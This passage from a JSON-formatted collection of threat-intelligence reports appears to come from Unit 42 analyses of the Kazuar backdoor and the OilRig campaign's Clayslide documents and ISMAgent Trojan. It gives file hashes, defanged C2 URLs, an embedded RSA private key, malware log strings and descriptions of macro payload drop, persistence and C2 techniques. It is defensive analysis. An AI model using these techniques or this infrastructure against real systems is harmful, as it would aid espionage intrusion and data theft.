                "Also, Kazuars cmd command will run commands using cmd.exe for Windows systems and /bin/bash for Unix systems.",
                "These two commands provide evidence that the authors of Kazuar intended to use this malware as a cross-platform tool to target both Windows and Unix systems."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Kazuar contains three commands related to plugins: plugin, plugout and pluglist.",
                "These three commands allow an actor to administer a framework that allows Kazuar to use additional plugins.",
                "This plugin framework provides Kazuar potentially endless functionality, as its operators can provide additional .NET applications that Kazuar can load and execute."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While many backdoor Trojans have extensive command handlers and plugin frameworks, Kazuars remote command provides a functionality that is rarely seen in backdoors used in espionage campaigns.",
                "This command instructs the Trojan to start a thread to listen for inbound HTTP requests, which effectively turns Kazuar into a webserver.",
                "This functionality provides an API for the Trojan to run commands on the compromised system.",
                "Figure 8 shows the code within Kazuar that provides this functionality."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 HTTP method handler used by Kazuar to provide threat actors with API access"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To initiate this functionality, the actor will issue the 'remote command and provide a list of URI prefixes that Kazuar's HTTP listener will process and respond to.",
                "The URI prefix supplied by the actor would be added to the Prefixes property of the HttpListener class, which requires a schema, a host, an optional port and optional path.",
                "The actor would then issue HTTP requests to URLs that match these URI prefixes using specific methods, specifically OPTIONS, POST, GET and PUT methods to interact with the compromised system using Kazuars command set seen in Table 3."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This functionality flips the communication flow between the Trojan and the C2 server.",
                "Instead of the Trojan initiating communications with its C2 server, the C2 server sends requests directly to the Trojan.",
                "This communications flow is important if the compromised system is a remotely accessible server that may raise flags when initiating outbound requests.",
                "Also, by creating this type of API access, the threat actors could use one accessible server as a single point to dump data to and exfiltrate data from."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 HTTP methods and the functionality they provide in Kazuar's API"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This functionality flips the communication flow between the Trojan and the C2 server.",
                "Instead of the Trojan initiating communications with its C2 server, the C2 server sends requests directly to the Trojan.",
                "This communications flow is important if the compromised system is a remotely accessible server that may raise flags when initiating outbound requests.",
                "Also, by creating this type of API access, the threat actors could use one accessible server as a single point to dump data to and exfiltrate data from."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While yet another fully featured backdoor alone is not particularly novel, the existence of a code path for Unix, combined with the portability of .NET Framework code makes the Kazuar Trojan an interesting tool to keep an eye on.",
                "Another interesting portion of this malware is its remote API that allows actors to issue commands to the compromised system via inbound HTTP requests.",
                "Based on our analysis, we believe that threat actors may compile Windows and Unix based payloads using the same code to deploy Kazuar against both platforms.",
                "Palo Alto Networks AutoFocus subscribers can explore additional samples using the Kazuar AutoFocus tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8490daab736aa638b500b27c962a8250bbb8615ae1c68ef77494875ac9d2ada2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b51105c56d1bf8f98b7e924aa5caded8322d037745a128781fa0bc23841d1e70"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bf6f30673cf771d52d589865675a293dc5c3668a956d0c2fc0d9403424d429b2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cd4c2e85213c96f79ddda564242efec3b970eded8c59f1f6f4d9a420eb8f1858"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URLs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://gaismustudija[.]lv/wp-includes/pomo/kontakti.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://hcdh-tunisie[.]org/wp-includes/SimplePie/gzencode.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://www.gallen[.]fi/wp-content/gallery/"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "File Activity"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%LOCALAPPDATA%\\/[a-f0-9]{32}\\/[a-f0-9]{32}\\.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%LOCALAPPDATA%\\/[a-f0-9]{32}\\/[a-f0-9]{32}/"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%USERPROFILE%\\Start Menu\\Programs\\Startup\\*.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "RSA Keys"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<RSAKeyValue><Modulus>gSI+OxtBrfXVfSRRSlNIMVYr9HFy40jokIDkUqffhU7Y/VcFB1nc8GwT4GOjK6lR/mJi3XcGg+nxqR9iLoeoOLgBFFz9O1l++81tPtRaVZ8yg+IzmZlaMhdOg0apatxhjRA/4pYOhZHwifQIjZzid6/+BgYIPBXWcX8e58l1PH+chm3DJzJ2gdHOsx6Dz9HHPr+sGLshAFF35ICb/11jq0vU9KU7CjYdf0Rvl16EDYyUQXbIG1ZMaTDzBrMcXZrBfXHEqn2Qwr4NiaDUwOwGCynBtSZXoNOfHArYxbRaBA269SPKhZgCBqdAhYfPFe2q8r8Y4fz21iZTqTngMsA2zw==</Modulus><Exponent>EQ==</Exponent><P>hGjs2pEZW4pN2b0Bm9xl84zxqQ2BMSflj2xpf5MH+XvCY5BBN3YROm24LYtGwy3xOdKeUJOENvYbkvirBcm2ecRxmLgE5AMMeWxZpOayUtOUd+Abx3+TT8giPG3sqEHtuaHVUjypBloE4EWnFWrmq0f3+Kpi8kHFxLul9jHubsc=</P><Q>+ap/8gRvidWrAhZcAiCAYdFZIt6hSwBz5ohU5ZSPomv9e/Urtts8cin+QeBvDwF6UvyP1vz3wxUOXycaBI3StCMjCXHuBLN+wfpEhfdt6KKywsmW7I5OdogIbVRLTUJvBtiXBGG3c10ay3H8TYx00lt6GgcLAJZMZE4mHEjnj7k=</Q><DP>D5PfoT4/N/InRsrxIWU5K7Y6jFvxFNeEaznuSz55aKUl7ZiAJKR6f1gzyR9xvJv+Qwm4RbcAfu/HAjtfahe7HWJnt50twHjUSoU3uQwU+q964O0wcdLGCWLW2e7QjEP92ZqRkTRQHt1p/ERuAoUMFCaVpMjAWLxxnqyqHPbQwb0=</DP><DQ>vuvLQJn68O6v8omRp0YH0lTLsUDVsdMrdA3mkXGbA7v+E38/i9TT3tTRfaugOKbG9CqMHN+QSeLs31oi9Gxz8yntnc+X5XozwYMlV2Lbk8e14D/Nw/RaHmgGcbjuSiO+UIeCiuFQDOzYQTkMO01KRoIwMgVixDay40rR2WTtT8k=</DQ><InverseQ>cfVixwsMog8F8CDikcYKNmUGNJPeJ4grdJi4ZIMX5mSuhdvSccTnx7JoCMJ2LKwFLyMnmZIIeYF4EYBgwHz6rumL8Zam6Zr04uIpxWL3MZyR9BImREmH6e6aFzHq/P02phU6tNbzkHMp6QGsfgtkLSmzOed0GsvfwAxCfD20PXU=</InverseQ><D>PMTR/bJ5Qs4KHMXL5r3Hnr8jvlOBW+YTFtM+RQO0evftpGUviv0crWAJWok9ujGP/z1bs4NOXDHbImkfJPSLZfw8vknglGZZ3+gzaNxmvuGBLwEJOTkbYt3KmCFAqsIPyemHebAG1XHam0WprA2Xv9pZbD8S7xlV2w6lIcg3K4ak6tNG2yKepoQ2DvFdF/ZTtOu0ybE+g8AA6UxWCy/liTLN2fxgVwP45XAAFIue/x6aF6m09gxi/xJaxwafEeonVZU9aaqpbyb5eeMixRSbkVuK2DZrF/lW9oedp0mYtI+E7nRyxykxFl3rrC9B8ETKBzNONPgB4PpuaSSdC0ELcQ==</D></RSAKeyValue>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<RSAKeyValue><Modulus>m4SbvlZhH5UzcgDLIEIygjTCCQMxc/TrwUYZ5JA5SU2jtSBt9aqwljKJ7h4Tv5eP2Efy4Z+2QajDNtOThift4nVTWsl+iOoMKKV6pvQOFj6k2P4kRTBGo/t8J46j7DqnFeMHXUjhjv2RFnp1nms8thE6+MJsI0lnxYTLBip5mNbj+Jbr7vVzK8MKnjGxsr9FoRBVNyZM+ILFu3aO62z1a8PIrI4kqVVggD35oF4WdSrmVLFvec/1ej3Cx12NjqCXo3lZhwxlIKjFNMNtslXnk0o9L/ZlWlEjqXiez/3ryzpVBrlrtb9D+x1ZRtv58jtdSTE61//jtEb3mMUeTry+2w==</Modulus><Exponent>EQ==</Exponent></RSAKeyValue>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Decrypted Log and Error Messages"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "'{0}' autorun algorithm is not supported!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "'{0}' request method isn't supported."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Accessed date mismatch in get command!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Accessed date mismatch in list command!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Action with identifier {0} is not implemented."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Autorun command requeres autorun type to be set!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Autorun failed due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cmd command requires actual commands list!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Commiting suicide..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Control server address '{0}' is invalid."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Copy command requires destination path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Copy command requires source path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Copying file from {0} to {1}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Created date mismatch in get command!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Created date mismatch in list command!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Directory listing for {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Executing command with {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Failed to create agent due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Failed to create channel due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Failed to create injector due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Fatal failure due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Getting file query {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Getting system information..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Going to sleep for {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Got '{0}' command from {1}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Got new '{0}' command."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Got new task #{0} from {1}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HTTP listening isn't supported."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IPC channel is not ready."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Injected into explorer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Injected into {0} [{1}]."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Injecting into explorer..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Injecting into {0} [{1}]..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Injection failed due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Installing plugin..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Invalid FTP server status ({0})."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Invalid last contact time."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Invalid or unknown action format ({0})!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Invalid sender interval."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Kazuar's {0} started in process {1} [{2}] as user {3}/{4}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Killing processes..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "List command requires file query string!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Listening"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Listing plugins..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Listing processes..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Max interval value is less than min value!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Max interval value is more than supported!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Min interval value is less than supported!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Modified date mismatch in get command!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Modified date mismatch in list command!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Move command requires destination path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Move command requires source path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Moving file from {0} to {1}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mozilla/5.0 (Windows NT {0}.{1}; rv:22.0)",
                "Gecko/20130405 Firefox/23.0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mozilla/5.0 (X11; {0} {1}; rv:24.0) Gecko/20100101 Firefox/24.0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "New plugin {0} was installed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "No servers available now."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugin command requires payload!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugin installed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugin removed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugin {0} was removed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugin {0} was started."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugout command requires plugin name string!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Proc kill command requires name or pid to be set!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Process {0} [{1}] exited with {2} code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Process {0} [{1}] impersonated."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Put command requires correct file path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Put command requires payload!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Putting file to {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote control failed due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote failed due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote iteration failed due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote request from {0} failed due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remove command requires file path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Removing file {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Removing plugin..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Request was sent to {0}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Result #{0} was sent to {1}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Result #{0} was taken by {1}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Run command requires executable path!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Run-time error {0}:{1:X8}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Run-time error {0}:{1}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Scheme '{0}' is not supported!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Searching file query {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Send iteration failed due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sending request to {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sending result #{0} to {1}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Server command requires at least one server!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting agent id to {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting autorun type to {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting remote type to {0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting transport interval to [{0} - {1}]..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting transport processes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Setting transport servers:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shellcode error {0:X16}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sleep interval is longer than supported!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Solving task #{0}..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Startup path is empty."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Taking screen shot..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Taking webcam shot..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Task #{0} execution finished."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Task #{0} execution started:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Task #{0} failed due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Task #{0} solved."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Transport command requires at least one process name!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Transport process name '{0}' is invalid."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Transport processes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to create capture window."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to delete task #{0} file due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to execute command due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to execute task #{0} due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to get last contact time due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to get task from {0} due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to impersonate {0} [{1}] due to {2}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to return logs due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to send result #{0} to {1} due to {2}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to start plugin {0} due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to stop plugin {0} due to {1}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to store agent id due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to store autorun type due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to store interval due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to store remote type due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to store servers due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unable to store transports due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unhandled exception {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upgrade command requires payload!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upgrading agent..."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using default agent id due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using default autorun type due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using default interval due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using default remote type due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using default servers due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using default transports due to {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Uuid command requires identifier!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Waiting for shellcode failed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Waiting for window '{0}' failed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "explorer.exe, {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ERROR: {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Plugin {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{0} doesn't exist!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{0} was skipped."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "proc - {0} [{1}]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "time - {0}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "user - {0}/{1} ({2})"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Register for Ignite 17 Security Conference \nVancouver, BC June 1215, 2017"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ignite 17 Security Conference is a live, four-day conference designed for todays security professionals.",
                "Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry.",
                "Visit the Ignite website for more information on tracks, workshops and marquee sessions."
            ]
        }
    ],
    "7a8a63775846b7acefc52df3f488fb37260dc207": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has discovered activity involving threat actors responsible for the OilRig campaign with a potential link to a threat group known as GreenBug.",
                "Symantec first reported on this group back in January 2017, detailing their operations and using a custom information stealing Trojan called ISMDoor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In July 2017, we observed an attack on a Middle Eastern technology organization that was also targeted by the OilRig campaign in August 2016.",
                "Initial inspection of this attack suggested this was again the OilRig campaign using their existing toolset, but further examination revealed not only new variants of the delivery document we named Clayslide, but also a different payload embedded inside it.",
                "In the past, we had primarily associated the OilRig campaign with using the Clayslide documents to deliver as a payload a Trojan we named Helminth; in this instance, the payload was instead a variant of the ISMDoor Trojan with significant modifications which we are now tracking as ISMAgent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the targeted organization.",
                "All of the emails sent had the same subject, attachment filename, and attached Excel file (SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We identified the Excel file attached to the delivery email as a variant of the Clayslide delivery documents used by the OilRig campaign.",
                "A closer look revealed that although it was similar to previous Clayslide documents, it was also quite different in several aspects.",
                "Like the previous samples, it displays a worksheet titled Incompatible containing a banner that shows a fake compatibility warning message (Figure 1).",
                "The message is an attempt to trick the user into clicking the Enable Content button, which would run a malicious macro embedded within the Excel file"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Incompatible message attempting to trick the victim into enabling macros"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro within the delivery document will unhide and display a new worksheet that contains a fake invoice for Citrix products, as seen in Figure 2.",
                "This fake invoice acts as a decoy document to minimize the users suspicions that any malicious activity occurred."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decoy document opened to minimize suspicions of compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the macro displays the decoy invoice spreadsheet, it silently runs malicious code in the background to install its payload.",
                "The malicious code starts by concatenating several base64 encoded strings into a single variable.",
                "As you can see in the following code snippet, the variable name Paltofp1 suggests that the author of this code may want our attention:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro then writes the concatenated base64 encoded data to the file %PUBLIC%\\Libraries\\B642.txt.",
                "It then reads in the B642.txt file and decodes the data, which it will save to the file %PUBLIC%\\Libraries\\servicereset.exe (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9).",
                "The servicereset.exe file is the payload of this attack, which is a variant of ISMDoor that we track as ISMAgent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The script then creates a file named %PUBLIC%\\Libraries\\OfficeServicesStatus.vbs which contains a VBScript that will execute the servicereset.exe file using the command line.",
                "Lastly, as a persistence mechanism, a scheduled task named OfficeServicesStatus will be created, set to run every three minutes, as seen in Figure 3."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Scheduled task created by the macro within the delivery document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While hunting for other samples similar to the one observed in the attack against the technology organization, we discovered yet another variant of Clayslide (SHA256: 5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902).",
                "This sample was dated June 2017, a month older than the newest version containing ISMAgent.",
                "Based upon timestamping and similarities with both the original Clayslide documents as well as the newest ISMAgent loaded ones, we believe this June 2016 sample to be an iterative version of Clayslide."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The June 2017 sample of Clayslide contained the same OfficeServicesStatus.vbs file found in the ISMAgent Clayslide document, but instead of having the payload embedded in the macro as segregated base64 strings that would be concatenated, this variant obtained its payload from multiple cells within the Incompatible worksheet.",
                "This technique was observed in previous Clayslide documents to access the script variant of the Helminth Trojan in earlier OilRig attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Also, the June 2017 sample contained artifacts observed in previous Clayslide documents as documented in a blog post we published in April.",
                "Specifically, we found this comment:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "along with the following common function names within the macro code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although structurally the document was more similar to the originally discovered Clayslide documents, this June 2017 sample was designed to load ISMAgent instead of Helminth.",
                "We do not have targeting details for this sample, although the decoy document contained a similar theme to the newest Clayslide document, displaying vendor related information (Figure 4)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Decoy document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A table displaying the differences in each variant of Clayslide is below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Comparison of Clayslide versions"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9) delivered in the June 2016 attack is a variant of the recent ISMDoor versions that use DNS tunneling for its C2 communications.",
                "On May 1, 2017, Arbor Networks published research on ISMDoor using DNS tunneling to communicate with its C2 server, which is nearly identical to the DNS tunneling the payload of this attack carries out.",
                "Due to considerable differences and evidence of potentially different authors between the previous ISMDoor samples and this newly discovered variant, we are tracking this new variant as ISMAgent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ISMAgent tool comes with a default configuration that specifies the C2 domain and the number of minutes between further attempts to execute the tool.",
                "However, an actor can use command line arguments to create a new ISMAgent sample that is configured with a specified C2 domain and a specified number of minutes to automatically execute the Trojan.",
                "The following command line arguments are supported:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Command line options available in ISMAgent for configuration"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the Trojan is executed with these arguments, the Trojan will read its own file data in, and search for two strings of characters within the data that it will overwrite with the configured settings.",
                "The Trojan searches for a string of \"^\" characters that it will overwrite with the C2 domain provided via the \"-c\" argument, and it searches for the string \"%%%%\" that it will replace with the number of minutes provided via the \"-m\" argument.",
                "The \"%%%%\" string exists within the following larger string, that the Trojan uses as a command to execute in order to create a scheduled task named \"TimeUpdate\" to execute the payload after the specified number of minutes passes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan is able to use two mechanisms to communicate with its C2 server: HTTP requests and DNS tunneling.",
                "The DNS tunneling protocol found in this payload is remarkably similar to recent ISMDoor samples, as documented in Arbor Networks research.",
                "Similar message handling is found in both ISMAgent and ISMDoor, in addition to the existence of strings in both samples, such the hardcoded IPv6 values.",
                "The similarities may allow for backward compatibility between ISMAgent and ISMDoor C2 infrastructure.",
                "In the payloads themselves, a number of differences exist, enough that in essence they appear to be different tools."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Regardless of the communications method used, the Trojan will parse the received data from the C2 server for a GUID field that the Trojan will use as a unique identifier, as well as commands the Trojan should run on the compromised system:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ISMAgent prioritizes HTTP as its mechanism to communicate with the C2 server, but if it is unable to reach the C2 server it will switch to the DNS tunneling mechanism.",
                "To carry out its HTTP C2 communications, the Trojan prepends \"www.\"",
                "to the configured C2 domain and issues a DNS query to resolve this domain.",
                "The Trojan will use the resolved IP address as the host in the HTTP beacon request."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For instance, the sample used in this attack was configured to use ntpupdateserver[.]com for its C2 server.",
                "The HTTP C2 process would attempt to resolve the domain www.ntpupdateserver[.]com, which resolved to 142.54.179[.]90, so the Trojan would use the string http:/w as the basis of the C2 URL.",
                "The initial beacon sent from the Trojan to the C2 server using a URL structured in the following way:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server will respond to this request with a command string using the previously mentioned format.",
                "During the attack on the technology organization,we observed the C2 server issuing the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the C2 server provides a command to execute on the system, the Trojan executes it using cmd.exe and writes the output to %TEMP%\\runlog[random number].tmp.",
                "The Trojan will read this runlog file and send it to the C2 server via an HTTP POST request to a URL structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The HTTP POST request contains an anomalous boundary value of myboundary and hardcoded filename value of a.a, as seen below, which may be used to generate detection signatures for this behavior:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While we did not observe the C2 server attempting to run additional commands via ISMAgent, we were able to analyze the Trojan itself to determine the functionality of its available commands.",
                "If the command string contains a URL to download a file to the system, the Trojan will simply use the URLDownloadToFileA function to download and save the file to the target system in the %TEMP% folder.",
                "If the C2 server provides a path to a file it wishes to upload from the system, the Trojan will open the file, read its contents, and then upload its contents via an HTTP POST to the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
